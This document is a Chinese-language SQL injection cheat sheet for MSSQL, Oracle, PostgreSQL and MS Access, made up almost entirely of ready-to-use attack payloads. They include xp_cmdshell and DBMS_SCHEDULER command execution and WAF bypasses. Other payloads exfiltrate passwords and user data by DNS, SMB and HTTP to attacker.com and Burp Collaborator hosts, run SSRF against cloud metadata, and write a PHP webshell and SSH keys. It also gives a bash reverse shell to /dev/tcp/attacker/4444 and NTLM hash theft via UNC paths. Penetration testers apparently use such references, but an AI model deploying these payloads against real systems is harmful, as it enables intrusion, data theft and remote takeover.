# 数据库特定注入技术

> MSSQL、Oracle、PostgreSQL、MS Access 专有注入技术：RCE、SSRF、文件操作、带外外带。

---

## 一、MSSQL

### 1.1 xp_cmdshell RCE

```sql
-- 开启（需 sysadmin）
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- WAF 绕过：无分号堆叠开启
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

### 1.2 无分号堆叠查询

MSSQL 特性：语句间不需要分号，可绕过仅检测 `;` 的 WAF：

```sql
SELECT 'a' SELECT 'b'
-- WAF 绕过：末尾添加无害 exec() 使语句被误判
admina'union select 1,'admin','testtest123'exec('select 1')--
```

### 1.3 DNS/SMB 带外外带 (OOB)

```sql
-- xp_dirtree（TCP 445，无需特殊权限）
DECLARE @d varchar(100); SELECT @d=(SELECT user);
EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\\a"');
-- 替代：xp_fileexist / xp_subdirs 同理

-- fn_xe_file_target_read_file（需 VIEW SERVER STATE）
SELECT * FROM fn_xe_file_target_read_file('C:\*.xel',
  '\\'+(SELECT pass FROM users WHERE id=1)+'.attacker.burpcollaborator.net\1.xem',null,null);

-- fn_get_audit_file（需 CONTROL SERVER）
SELECT * FROM fn_get_audit_file(
  '\\'+(SELECT pass FROM users WHERE id=1)+'.attacker.burpcollaborator.net\',default,default);
```

### 1.4 Linked Server 横向移动

```sql
EXEC sp_linkedservers;
SELECT * FROM OPENQUERY([linked_server], 'SELECT @@version');
EXEC('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [linked_server];
EXEC('xp_cmdshell ''whoami''') AT [linked_server];
```

### 1.5 AD 域枚举

```sql
SELECT DEFAULT_DOMAIN();
SELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'));
-- 爆破 RID 1000-2000 枚举域用户
SELECT SUSER_SNAME(0x0105000000000515...e8030000);
```

### 1.6 报错注入变体与 FOR JSON

```sql
-- CAST/CONVERT 报错
' AND 1=CONVERT(int,@@version)--
' AND 1=CAST(db_name() AS int)--
-- 替代函数绕过 WAF
' %2b user_name(@@version)--
' %2b DB_NAME(@@version)--

-- FOR JSON 一次提取整表（比 FOR XML 更简洁）
' union select null,concat_ws(0x3a,table_schema,table_name,column_name),null from information_schema.columns for json auto--
```

### 1.7 MSSQL WAF 绕过

```sql
id=1%C2%85union%C2%85select%C2%A0null,@@version,null--   -- 非标准空白符
id=0eunion+select+null,@@version,null--                    -- 科学计数法前缀
id=0xunion+select+null,@@version,null--                    -- 十六进制前缀
id=1+union+select+null,@@version,null+from.users--         -- FROM 和列名间用点号
```

---

## 二、Oracle

### 2.1 UTL_HTTP / HTTPURITYPE SSRF

```sql
SELECT UTL_HTTP.request('http://169.254.169.254/latest/meta-data/') FROM dual;
SELECT HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() FROM dual;
-- 端口探测：ORA-12541 = 关闭, ORA-29263 = 开放
SELECT UTL_HTTP.request('http://internal:8080') FROM dual;
```

### 2.2 UTL_TCP 原始 TCP（SSRF/内网扫描）

```sql
DECLARE c utl_tcp.connection; retval pls_integer;
BEGIN
  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
  retval := utl_tcp.write_line(c,'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN LOOP dbms_output.put_line(utl_tcp.get_line(c,TRUE));
  END LOOP; EXCEPTION WHEN utl_tcp.end_of_input THEN NULL; END;
  utl_tcp.close_connection(c);
END;
```

### 2.3 DBMS_SCHEDULER RCE

```sql
BEGIN
  DBMS_SCHEDULER.create_program('exec_cmd','EXECUTABLE','/bin/bash',2,FALSE);
  DBMS_SCHEDULER.define_program_argument('exec_cmd',1,'p1','VARCHAR2','-c');
  DBMS_SCHEDULER.define_program_argument('exec_cmd',2,'p2','VARCHAR2','id > /tmp/pwned');
  DBMS_SCHEDULER.enable('exec_cmd');
  DBMS_SCHEDULER.create_job('run_cmd','exec_cmd',TRUE,TRUE);
END;
```

### 2.4 XML 函数与 XXE 外带

```sql
-- EXTRACTVALUE 报错
' AND 1=EXTRACTVALUE(XMLType('<a>'||(SELECT user FROM dual)||'</a>'),'/a')--

-- XXE 外带数据
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [
  <!ENTITY % x SYSTEM "http://'||(SELECT password FROM users WHERE username=''admin'')||'.attacker.com/">
  %x;]>'),'/l') FROM dual--
```

### 2.5 DNS 外带（UTL_INADDR / DBMS_LDAP）

```sql
-- UTL_INADDR：无需端口/ACL，仅 DNS
SELECT UTL_INADDR.get_host_address(
  (SELECT name FROM v$database)||'.'||(SELECT user FROM dual)||'.attacker.oob.server') FROM dual;

-- DBMS_LDAP：DNS 外带 + 端口扫描
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker.burpcollaborator.net',80) FROM dual;
-- ORA-31203 = 端口关闭，返回 session 值 = 端口开放
```

### 2.6 ACL 绕过与时间盲注

```sql
-- ORA-24247 时搜索已有网络权限的 DEFINER 存储过程
SELECT owner,object_name FROM dba_objects WHERE object_type='PROCEDURE' AND authid='DEFINER';

-- 时间盲注
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
-- 无权限替代：HEAVY QUERY
' AND 1=(SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c)--
```

---

## 三、PostgreSQL

### 3.1 COPY TO/FROM 文件读写

```sql
-- 读文件
CREATE TABLE t(c text); COPY t FROM '/etc/passwd'; SELECT * FROM t;
-- 写 Webshell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
-- 写 SSH 公钥
COPY (SELECT 'ssh-rsa AAAA...key...') TO '/var/lib/postgresql/.ssh/authorized_keys';
```

### 3.2 COPY TO PROGRAM 直接 RCE

PostgreSQL 9.3+ 超级用户可直接执行系统命令：

```sql
COPY cmd_output FROM PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
```

### 3.3 lo_import/lo_export 大对象文件操作

```sql
-- 读取文件
SELECT lo_import('/etc/passwd',1337);
SELECT encode(data,'escape') FROM pg_largeobject WHERE loid=1337;
-- 写入文件
SELECT lo_import('/dev/null',9999);
UPDATE pg_largeobject SET data=decode('hex_data','hex') WHERE loid=9999 AND pageno=0;
SELECT lo_export(9999,'/tmp/output');
-- 清理
SELECT lo_unlink(1337); SELECT lo_unlink(9999);
```

### 3.4 扩展 (Extension) RCE

```sql
-- 旧版（< 8.2）直接调用 libc
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT;
SELECT system('id');

-- 新版：编译带 PG_MODULE_MAGIC 的 .so 上传后加载
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so','pg_exec' LANGUAGE C STRICT;

-- 最新版：大对象上传到 data 目录 + 目录穿越
SELECT lo_export(1337,'poc.dll');
CREATE FUNCTION connect_back(text,integer) RETURNS void AS '../data/poc','connect_back' LANGUAGE C STRICT;
```

### 3.5 语言扩展 RCE

```sql
SELECT lanname,lanpltrusted,lanacl FROM pg_language;  -- 检查已安装语言

-- plpythonu
CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS varchar(65535) stable AS $$
    import os; return os.popen(cmd).read()
$$ LANGUAGE 'plpythonu';
SELECT exec('id');

-- plperlu
CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$ return `$_[0]`; $$ LANGUAGE plperlu;

-- 安装语言（需 superadmin）
CREATE EXTENSION plpythonu;  -- 或 plpython3u / plperlu
```

### 3.6 报错注入与带外

```sql
-- 类型转换报错
' AND 1=CAST(version() AS int)--

-- 时间盲注
' OR (SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- dblink 带外
CREATE EXTENSION dblink;
SELECT * FROM dblink('host=attacker.com user=a password='||(SELECT version())||' dbname=a','SELECT 1') AS t(i int);
```

---

## 四、MS Access

### 4.1 语法限制速查

- 无注释 -- 用 `%00` (NULL) 截断，或 `WHERE ''='` 闭合
- 不支持堆叠查询
- 无 LIMIT，用 `TOP N`；字符串拼接用 `&`(%26) / `+`(%2b)
- UNION/子查询必须带 `FROM <有效表名>`

### 4.2 系统表与暴力猜解

```sql
-- MSysObjects 获取表名（通常无权访问，需猜解）
SELECT MSysObjects.name FROM MSysObjects WHERE MSysObjects.type In(1,4,6)
  AND MSysObjects.name NOT LIKE '~*' AND MSysObjects.name NOT LIKE 'MSys*';

-- 暴力猜解表名（链式等号）
'=(select+top+1+'lala'+from+<table_name>)='
-- 猜解列名
'=column_name='
-1' GROUP BY column_name%00
```

### 4.3 UNION 盲注提取

利用链式等号 + Mid 函数逐字符提取：

```sql
'=(Mid(username,1,3)='adm')='
'=(Mid((SELECT LAST(username) FROM (SELECT TOP 1 username FROM users)),1,3)='Alf')='
IIF((SELECT Mid(LAST(username),1,1) FROM (SELECT TOP 10 username FROM users))='a',0,'ko')
```

### 4.4 文件系统与 NTLM 窃取

```sql
-- 获取 Web 根路径（不存在的 DB 触发报错泄露路径）
1' UNION SELECT 1 FROM FakeDB.FakeTable%00
-- 文件存在探测
1' UNION SELECT name FROM msysobjects IN '\boot.ini'%00

-- UNC 路径窃取 NTLM 哈希
1' UNION SELECT TOP 1 name FROM MSysObjects IN '\\attacker\share\poc.mdb'--
-- 时间盲注变体（利用网络延迟）
' UNION SELECT 1 FROM t IN '\\slow-host\x\dummy.mdb'--
```

### 4.5 常用函数

```sql
Mid('admin',1,1)   -- 子串（位置从 1 开始）
LEN('1234')         -- 长度
ASC('A')/CHR(65)   -- ASCII 互转
IIF(1=1,'a','b')   -- 条件判断
TOP N / LAST()     -- 行选择
```

---

## 五、数据库识别速查

```sql
-- MSSQL:      @@CONNECTIONS=@@CONNECTIONS / BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
-- Oracle:     ROWNUM=ROWNUM / RAWTOHEX('AB')=RAWTOHEX('AB')
-- PostgreSQL: 5::int=5 / current_database()=current_database()
-- MS Access:  val(cvar(1))=1 / IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0

-- 时间盲注识别
-- MSSQL:      ' WAITFOR DELAY '0:0:5'--
-- Oracle:     ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
-- PostgreSQL: ' OR pg_sleep(5)--
```
